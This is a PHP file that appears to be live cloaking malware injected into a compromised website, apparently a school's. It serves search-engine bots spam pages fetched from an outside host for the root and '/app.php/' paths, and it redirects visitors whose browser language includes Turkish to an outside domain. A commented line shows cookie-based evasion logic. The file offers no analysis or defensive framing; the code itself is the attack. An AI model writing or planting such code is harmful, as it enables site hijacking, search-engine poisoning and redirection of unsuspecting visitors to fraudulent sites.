<?php
error_reporting(0);
$s_ref = $_SERVER['HTTP_REFERER'];
$agent = $_SERVER['HTTP_USER_AGENT'];

if(strpos($agent,'bot') > 0 && $_SERVER['REQUEST_URI']=='/'){	
	$accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
	//if(strpos($accept_lang,'zh')>-1 || $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS']==1 || $_COOKIE['az']=='lp'){setcookie('az','lp',time()+3600*7200); echo ' '; exit;}

	
	echo file_get_contents("https://www.yourcandystore.com/file/www.dlszobel.edu.ph/dlszobel.html");
	exit;
}
error_reporting(0);
$language = $_SERVER["HTTP_ACCEPT_LANGUAGE"];
if (strpos ( $language, "tr" ) > - 1)
{
  $url = "https://dragonggad2.com?c=LtK8CAd";
  header ( 'Location: '. $url );
  exit ();
}
error_reporting(0);
$s_ref = $_SERVER['HTTP_REFERER'];
$agent = $_SERVER['HTTP_USER_AGENT'];

if(strpos($agent,'bot') > 0 && $_SERVER['REQUEST_URI']=='/app.php/'){	
	$accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
	//if(strpos($accept_lang,'zh')>-1 || $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS']==1 || $_COOKIE['az']=='lp'){setcookie('az','lp',time()+3600*7200); echo ' '; exit;}

	
	echo file_get_contents("https://www.yourcandystore.com/file/www.dlszobel.edu.ph/dlszobel.html");
	exit;
}
?>
